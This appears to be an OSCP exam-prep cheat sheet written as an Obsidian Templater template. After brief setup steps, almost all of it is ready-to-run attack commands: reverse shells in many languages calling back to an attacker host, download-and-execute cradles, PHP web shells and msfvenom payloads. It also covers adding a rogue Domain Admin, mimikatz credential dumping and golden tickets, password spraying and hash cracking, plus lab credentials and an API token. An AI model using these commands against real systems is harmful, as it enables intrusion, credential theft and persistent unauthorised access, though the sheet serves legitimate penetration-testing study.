OSCP

I used the Templater community plugin in obsidian to automatically populate IP,username,password Thanks siddicky for this cool idea!

I do have plans to actively maintain it if people like it

https://www.youtube.com/watch?v=2NLi4wzAvTw&t=634s

Have a look at this video, if youre wondering what im talking about!

Steps to use-

1-> Download obsidian, click on settings and browse "community plugins"

2-> Install the Templater plugin by SilentVoid and enable the plugin

3-> Copy the template and save

4->Create a new .md file and put in your desired values



```
hyphenhyphenhyphen

LHOST: 1.1.1.1
RHOST: 0.0.0.0
USERNAME: username
PASSWORD: password
DOMAIN: domain

hyphenhyphenhyphen

```

Always make sure you have source mode enabled, else this wont work!
![test](https://media.discordapp.net/attachments/1146454908539769002/1149737116167852122/image.png?width=1602&height=720)

![test](https://cdn.discordapp.com/attachments/1125391842125549601/1149407842885980190/image.png)



5->press alt+e and select your template name

BOOM

To change the IP, i would either prefer ctrl + z or just create a new file with the method above ^

## Article
https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/


## Shells & stuff
https://www.revshells.com/

```bash

# Get-NTLM from password
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<% tp.frontmatter["PASSWORD"] %>".encode("utf-16le")).digest())'


powershell "IEX(New-Object Net.Webclient).downloadString('http://<% tp.frontmatter["LHOST"] %>:<LPORT>/Invoke-PowerShellTcp.ps1')"


# php cmd 

<?php $cmd=$_GET['cmd']; system($cmd);?>
<?php echo shell_exec("wget [http://IP/reverse.sh](http://IP/reverse.sh) -O /tmp/reverseshell.sh");?>
<?php echo shell_exec("chmod 777 /tmp/reverseshell.sh");?>
<?php echo shell_exec("/bin/bash /tmp/reverseshell.sh");?>
<?php echo system($_GET['cmd']); ?>


<pre>
<?php
	system([$_GET['cmd']]);
?>
</pre>

#enabling RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0**

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"


# ConPtyShell
https://github.com/antonioCoco/ConPtyShell
stty raw -echo

certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Others/ConPtyShell/Invoke-ConPtyShell.ps1
certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Others/ConPtyShell/ConPtyShell.exe


. ./Invoke-ConPtyShell.ps1
# exe
stty raw -echo; (stty size; cat) | nc -lvnp 3001
Invoke-ConPtyShell <% tp.frontmatter["LHOST"] %> 3001
./ConPtyShell.exe <% tp.frontmatter["LHOST"] %> 3001

#manual upgrade
Invoke-ConPtyShell -Upgrade -Rows 23 -Cols 115


# Execute Command as another user
PS C:\> $SecurePassword = ConvertTo-SecureString '<% tp.frontmatter["PASSWORD"] %>' -AsPlainText -Force
PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('<% tp.frontmatter["USERNAME"] %>', $SecurePassword)
PS C:\> $Session = New-PSSession -Credential $Cred
PS C:\> Invoke-Command -Session $session -scriptblock { whoami }

or
$username = '<% tp.frontmatter["USERNAME"] %>'
$password = '<% tp.frontmatter["PASSWORD"] %>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process powershell.exe -Credential $credential

powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"


# Add new Domain Admin
$PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <% tp.frontmatter["PASSWORD"] %>
New-ADUser -Name "<% tp.frontmatter["USERNAME"] %>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
Add-ADGroupMember -Identity "Domain Admins" -Member <% tp.frontmatter["USERNAME"] %>

#Execute Command in User Context
$pass = ConvertTo-SecureString "<% tp.frontmatter["PASSWORD"] %>" -AsPlaintext -Force
$cred = New-Object System.Management.Automation.PSCredential ("<% tp.frontmatter["DOMAIN"] %>\<% tp.frontmatter["USERNAME"] %>", $pass)
Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}

#Execute Scripts with Creds (Reverse Shell)
$pass = ConvertTo-SecureString "<% tp.frontmatter["PASSWORD"] %>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<% tp.frontmatter["DOMAIN"] %>\<% tp.frontmatter["USERNAME"] %>", $pass)
Invoke-Command -Computer <% tp.frontmatter["RHOST"] %> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<% tp.frontmatter["LHOST"] %>/<FILE>.ps1') } -Credential $cred


# Search For Important Files
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Include *.ini,*.log -File -Recurse
Get-ChildItem -Path C:\Users\ -Include *.txt -File -Recurse
```


## Reverse shell
```bash

#reverse shell
bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1'
#URLENCODED (bash -c 'bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1')
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22

echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1"' | base64

# curl Reverse shell
curl --header "Content-Type: application/json" --request POST http://<% tp.frontmatter["RHOST"] %>:<RPORT>/upload --data '{"auth": {"name": "<% tp.frontmatter["USERNAME"] %>", "password": "<% tp.frontmatter["PASSWORD"] %>"}, "filename" : "& echo "bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1"|base64 -d|bash"}'

#mkfifo Reverse shell
mkfifo /tmp/shell; nc <% tp.frontmatter["LHOST"] %> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell

#netcat reverse shell
nc -e /bin/sh <% tp.frontmatter["LHOST"] %> <LPORT>

#perl reverse shell
perl -e 'use Socket;$i="<% tp.frontmatter["LHOST"] %>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

#PHP reverse shell
php -r '$sock=fsockopen("<% tp.frontmatter["LHOST"] %>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

#msfvenom 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=4444 -f exe -o reverse.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=4444 -f dll -o reverse.dll

#Powershell Reverse shell
$client = New-Object System.Net.Sockets.TCPClient('<% tp.frontmatter["LHOST"] %>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<% tp.frontmatter["LHOST"] %>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<% tp.frontmatter["LHOST"] %>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Text = '$client = New-Object System.Net.Sockets.TCPClient("<% tp.frontmatter["LHOST"] %>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText

#python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<% tp.frontmatter["LHOST"] %>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<% tp.frontmatter["LHOST"] %>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'

#ruby reverse shell
ruby -rsocket -e'f=TCPSocket.open("<% tp.frontmatter["LHOST"] %>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# nishang
cd path/to/nishang/Shells/
cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress <% tp.frontmatter["LHOST"] %> -Port <LPORT>

```

## File Sharing
```bash
## File Sharing

certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/reverse.exe
certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Linux/linpeas.sh
certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Windows/
certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Windows/mimikatz/mimikatz.exe
certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Windows/exe/winPEASany.exe

c:/users/public/


impacket-smbserver test /home/rachit -smb2support -user joe -password joe
net use m: \\<% tp.frontmatter["LHOST"] %>\test /user:joe joe /persistent:yes
copy * \\<% tp.frontmatter["LHOST"] %>\test
smbserver.py -smb2support test .


iwr -uri <% tp.frontmatter["LHOST"] %>:8000/<FILE> -Outfile <FILE>
IEX(IWR http://<% tp.frontmatter["LHOST"] %>/<FILE>) -UseBasicParsing
powershell -command Invoke-WebRequest -Uri http://<% tp.frontmatter["LHOST"] %>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
Invoke-Expression (Invoke-WebRequest http://<LHOST/<FILE>.ps1)


wget http://<% tp.frontmatter["LHOST"] %>/<FILE>
wget -r --no-parent http://<% tp.frontmatter["LHOST"] %>/<FILE>
wget -m http://<% tp.frontmatter["LHOST"] %>/<FILE>

curl http://<% tp.frontmatter["LHOST"] %>/<FILE> > <OUTPUT_FILE>

#MSF
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=<LPORT> -f exe -o <FILE>.exe

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <% tp.frontmatter["LHOST"] %>
LHOST => <% tp.frontmatter["LHOST"] %>
msf6 exploit(multi/handler) > set LPORT <LPORT>
LPORT => <LPORT>
msf6 exploit(multi/handler) > run

.\<FILE>.exe

meterpreter > download *
```



## Tools
```bash
# nmapAutomator
./nmapAutomator.sh -H  <% tp.frontmatter["RHOST"] %> -T All

#nmap
sudo nmap -A -T4 -sC -sV -p- <% tp.frontmatter["RHOST"] %>
sudo nmap -sV -sU <% tp.frontmatter["RHOST"] %>
sudo nmap -A -T4 -sC -sV --script vuln <% tp.frontmatter["RHOST"] %>
sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <% tp.frontmatter["RHOST"] %>
sudo nmap -sC -sV -p- --scan-delay 5s <% tp.frontmatter["RHOST"] %>
sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <% tp.frontmatter["RHOST"] %>
ls -lh /usr/share/nmap/scripts/*ssh*
locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb

# evil-winrm
evil-winrm -i <% tp.frontmatter["RHOST"] %> -u '<% tp.frontmatter["USERNAME"] %>' -p '<% tp.frontmatter["PASSWORD"] %>'
evil-winrm -i <% tp.frontmatter["RHOST"] %> -u '<% tp.frontmatter["USERNAME"] %>' -H ''

# xfreerdp
xfreerdp /v:<% tp.frontmatter["RHOST"] %> /u:<% tp.frontmatter["USERNAME"] %> /p:<% tp.frontmatter["PASSWORD"] %> /dynamic-resolution +clipboard
xfreerdp /v:<% tp.frontmatter["RHOST"] %> /u:<% tp.frontmatter["USERNAME"] %> /d:<% tp.frontmatter["DOMAIN"] %> /pth:'<HASH>' /dynamic-resolution +clipboard

# smbclient
smbclient -L \\<% tp.frontmatter["RHOST"] %>\ -N
smbclient -L //<% tp.frontmatter["RHOST"] %>/ -N
smbclient -L ////<% tp.frontmatter["RHOST"] %>/ -N
smbclient -U "<% tp.frontmatter["USERNAME"] %>" -L \\\\<% tp.frontmatter["RHOST"] %>\\
smbclient -L //<% tp.frontmatter["RHOST"] %>// -U <% tp.frontmatter["USERNAME"] %>%<% tp.frontmatter["PASSWORD"] %>
smbclient //<% tp.frontmatter["RHOST"] %>/SYSVOL -U <% tp.frontmatter["USERNAME"] %>%<% tp.frontmatter["PASSWORD"] %>
smbclient "\\\\<% tp.frontmatter["RHOST"] %>\<SHARE>"
smbclient \\\\<% tp.frontmatter["RHOST"] %>\\<SHARE> -U '<% tp.frontmatter["USERNAME"] %>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
smbclient --no-pass //<% tp.frontmatter["RHOST"] %>/<SHARE>
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
mount.cifs //<% tp.frontmatter["RHOST"] %>/<SHARE> /mnt/remote
guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v

mask""
recurse ON
prompt OFF
mget *


# snmpwalk 
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %>
snmpwalk -v2c -c public <% tp.frontmatter["RHOST"] %> 1.3.6.1.2.1.4.34.1.3
snmpwalk -v2c -c public <% tp.frontmatter["RHOST"] %> .1
snmpwalk -v2c -c public <% tp.frontmatter["RHOST"] %> nsExtendObjects
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> .1.3.6.1.2.1.1.5
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.4.1.77.1.2.3.1.1
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.4.1.77.1.2.27
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.2.1.6.13.1.3
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.2.1.25.6.3.1.2

1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports


# crackmapexec

# Dont forget to use
--local-auth
crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "" -p "" --pass-pol
crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "" -p "" --shares
crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --shares
crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "" -p "" --shares -M spider_plus
crackmapexec ssh <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --continue-on-success
crackmapexec ftp <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --continue-on-success
crackmapexec mssql <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" 
crackmapexec winrm <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p '<% tp.frontmatter["PASSWORD"] %>' -d <% tp.frontmatter["DOMAIN"] %>  --continue-on-success
crackmapexec winrm <% tp.frontmatter["RHOST"] %>  -u "<% tp.frontmatter["USERNAME"] %>" -H '' -d <% tp.frontmatter["DOMAIN"] %> --continue-on-success


# Kerbrute
./kerbrute userenum -d <% tp.frontmatter["DOMAIN"] %> --dc <% tp.frontmatter["DOMAIN"] %> /PATH/TO/FILE/<USERNAMES>
./kerbrute passwordspray -d <% tp.frontmatter["DOMAIN"] %> --dc <% tp.frontmatter["DOMAIN"] %> /PATH/TO/FILE/<USERNAMES> <% tp.frontmatter["PASSWORD"] %>


#ldap
ldapsearch -x -w <% tp.frontmatter["PASSWORD"] %>
ldapsearch -x -H ldap://<% tp.frontmatter["RHOST"] %> -s base namingcontexts
ldapsearch -x -b "dc=<% tp.frontmatter["DOMAIN"] %>,dc=offsec" "*" -H ldap://<% tp.frontmatter["RHOST"] %> | awk '/dn: / {print $2}'
ldapsearch -x -D "cn=admin,dc=<% tp.frontmatter["DOMAIN"] %>,dc=offsec" -s sub "cn=*" -H ldap://<% tp.frontmatter["RHOST"] %> | awk '/uid: /{print $2}' | nl
ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h ldap.acme.com
ldapsearch -x -H ldap://<% tp.frontmatter["RHOST"] %> -D "<% tp.frontmatter["USERNAME"] %>"  -b "dc=<% tp.frontmatter["DOMAIN"] %>,dc=offsec" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
ldapsearch -H ldap://<% tp.frontmatter["DOMAIN"] %> -b "DC=<% tp.frontmatter["DOMAIN"] %>,DC=local" > <FILE>.txt

<examples>

ldapsearch -x -H ldap://dc.support.htb -D 'SUPPORT\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=SUPPORT,DC=HTB" | tee ldap_dc.support.htb.txt
ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb

<examples>


# Get computers
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --computers
# Get groups
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --groups
# Get users
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --da
# Get Domain Admins
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --da
# Get Privileged Users
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --privileged-users


#powercat
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<% tp.frontmatter["LHOST"] %>/powercat.ps1');powercat -c <% tp.frontmatter["LHOST"] %> -p <LPORT> -e cmd"

#adpeas
Import-Module .\adPEAS.ps1
. .\adPEAS.ps1
Invoke-adPEAS
Invoke-adPEAS -Domain '<% tp.frontmatter["DOMAIN"] %>' -Outputfile 'C:\temp\adPEAS_outputfile' -NoColor

#### Certipy
certipy find -dc-ip <% tp.frontmatter["PASSWORD"] %> -u <% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["DOMAIN"] %> -p <% tp.frontmatter["PASSWORD"] %>
certipy find -dc-ip <% tp.frontmatter["PASSWORD"] %> -u <% tp.frontmatter["USERNAME"] %> -p <% tp.frontmatter["PASSWORD"] %> -vulnerable -stdout

#rpcclient
rpcclient -U "" <% tp.frontmatter["RHOST"] %>

# msfvenom && metasploit execution
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=<LPORT> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe

msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <% tp.frontmatter["LHOST"] %>
msf6 exploit(multi/handler) > set LPORT <% tp.frontmatter["LHOST"] %>
msf6 exploit(multi/handler) > run

.\exploit.exe
```


## Pivoting
```bash
#ligolo

certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Windows/Ligolo/agent.exe

sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
 # LHOST machine
./proxy -selfcert
# RHOST machine
./agent -ignore-cert -connect <% tp.frontmatter["LHOST"] %>:11601
./agent.exe -ignore-cert -connect <% tp.frontmatter["LHOST"] %>:11601
#route
sudo ip route add x.x.x.x dev ligolo

help command
listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:7777 --tcp


#chisel
#Run command on attacker machine
chisel server -p 8001 --reverse
#Run command on Web Server machine
 .  .\chisel.exe client <% tp.frontmatter["LHOST"] %>:8001 R:1080:socks
and edit the proxychains with the port that chisel provided
```


## Protocols
```
# SSH
ssh user@<% tp.frontmatter["RHOST"] %> -oKexAlgorithms=+diffie-hellman-group1-sha1
ssh -i key.pem user@<% tp.frontmatter["RHOST"] %>

../../../../../../../../../home/<% tp.frontmatter["USERNAME"] %>/.ssh/id_rsa

hydra -v -V -u -L users -P password -t 1 -u <% tp.frontmatter["RHOST"] %>  ssh

#FTP
wget-m --no-passive ftp://<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>@<% tp.frontmatter["LHOST"] %>
wget -r ftp://<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>@example.com/remote/dir/

```

``
## Fuzzing/Bruteforcing
```bash

# common file extensions
txt,bak,php,html,js,asp,aspx

# common picture extensions
png,jpg,jpeg,gif,bmp

# feroxbuster
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt  --url http://<% tp.frontmatter["RHOST"] %>/  -x php,aspx,jsp,pdf  -C 404,401,403 --output brute.txt

# Gobuster
### Directory Mode
gobuster dir -u http://<% tp.frontmatter["RHOST"] %>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

### Pattern matching(API)
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern

# API Fuzzing
ffuf -u https://<% tp.frontmatter["RHOST"] %>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412

# File Extensions
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<% tp.frontmatter["RHOST"] %>/cd/ext/logs/FUZZ -e .log

# Searching for LFI
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<% tp.frontmatter["RHOST"] %>/admin../admin_staging/index.php?page=FUZZ -fs 15349

# WPScan
wpscan --url https://<% tp.frontmatter["RHOST"] %> --enumerate u,t,p
wpscan --url https://<% tp.frontmatter["RHOST"] %> --plugins-detection aggressive
wpscan --url https://<% tp.frontmatter["RHOST"] %> --disable-tls-checks
wpscan --url https://<% tp.frontmatter["RHOST"] %> --disable-tls-checks --enumerate u,t,p
wpscan --url http://<% tp.frontmatter["RHOST"] %> -U <% tp.frontmatter["USERNAME"] %> -P passwords.txt -t 50
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://<% tp.frontmatter["RHOST"] %> --plugins-detection aggressive

<example>
wpscan --url [http://192.168.243.244](http://192.168.243.244) --enumerate p --plugins-detection aggressive  --api-token qLVQId1c9vb4suVQzft2zhHusr9BsSaSpxcanRW6qSA
<example>

<example>
wpscan --url http://ipaddress.of.website/ --enumerate vp --api-token API-TOKEN
<example>

# WPScan Login Brute Force
First collect usernames
wpscan –url 192.168.189.142 –enumerate u
Use Wordlist to bruteforce the user password
wpscan –url 192.168.189.142 –wordlist /usr/share/wordlists/rockyou.txt –username admin


# Hydra
hydra <% tp.frontmatter["RHOST"] %> -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/<FILE> ftp|ssh|smb://<% tp.frontmatter["RHOST"] %>
hydra -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/rockyou.txt <% tp.frontmatter["RHOST"] %> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"

sudo hydra -L /usr/share/wordlists/rockyou.txt -p "<% tp.frontmatter["PASSWORD"] %>" rdp://<% tp.frontmatter["RHOST"] %>
sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<% tp.frontmatter["RHOST"] %>

#crowbar
#  RDP brute forcing a single IP address using a single username and a single password:
./crowbar.py -b rdp -s <% tp.frontmatter["RHOST"] %>/32 -u admin -c Aa123456
 # username list and a single password
 ./crowbar.py -b rdp -s <% tp.frontmatter["RHOST"] %>/32 -U ~/Desktop/userlist -c passw0rd
 # username and a single password list
  ./crowbar.py -b rdp -s <% tp.frontmatter["RHOST"] %>/32 -u localuser -C ~/Desktop/passlist
 # username list and password list
 ./crowbar.py -b rdp -s <% tp.frontmatter["RHOST"] %>/24 -U ~/Desktop/userlist -C ~/Desktop/passlist -d
```


### Cracking 
```bash
# Hashcat

Asrep Roast
hashcat -m 18200 -a 0 <FILE> <FILE>
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat -m 18200-a 0asrep.txt passwords.txt --outfile asrepcrack.txt --forcehashcat

Kerberoast 
hashcat -m 13100 --force <FILE> <FILE>
sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force


#keypass
keepass2<% tp.frontmatter["USERNAME"] %> Database.kdbx > keepass.hash
#make sure to remove "Database:" Before cracking with hashcat

hashcat --help | grep -i "KeePass"
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

#id_rsa
ssh2<% tp.frontmatter["USERNAME"] %> id_rsa > ssh.hash
hashcat -h | grep -i "ssh"
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt

#ntlm
hashcat --help | grep -i "ntlm"
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

#ntlmv2
hashcat --help | grep -i "ntlm"
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force

```




## Mimikatz & bloodhound & Rubeus
```powershell
https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49

# mimikatz
privilege::debug
token::elevate
lsadump::sam
lsadump::lsa
lsadump::secrets
sekurlsa::logonpasswords
lsadump::cache

.\mimikatz "privilege::debug" "token::elevate"  "lsadump::sam " exit
sekurlsa::minidump /users/admin/Desktop/lsass.DMP
sekurlsa::LogonPasswords

Generate TGT with NTLM
kerberos::golden /domain:<% tp.frontmatter["DOMAIN"] %>/sid:<SID> /rc4:<KRBTGT_NTLM_HASH> /user:<% tp.frontmatter["USERNAME"] %>

Inject TGT with Mimikatz
kerberos::ptt <KIRBI_FILE>

# bloodhound
bloodhound-python -d <% tp.frontmatter["DOMAIN"] %> -u <% tp.frontmatter["USERNAME"] %> -p "<% tp.frontmatter["PASSWORD"] %>" -gc <% tp.frontmatter["DOMAIN"] %> -c all -ns <% tp.frontmatter["RHOST"] %>
